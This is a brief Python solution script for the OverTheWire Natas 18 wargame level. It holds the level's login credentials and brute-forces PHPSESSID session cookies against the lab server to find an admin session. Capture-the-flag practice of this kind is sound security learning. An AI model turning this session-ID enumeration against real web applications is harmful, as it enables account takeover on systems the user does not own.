import requests
from requests.auth import HTTPBasicAuth

Auth = HTTPBasicAuth("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
for _i in range(640):
    r = requests.get("http://natas18.natas.labs.overthewire.org/index.php?debug", auth=Auth, cookies={"PHPSESSID": str(_i)})
    if not "regular" in r.text:
        print("found: ", _i)
        continue
    print(_i)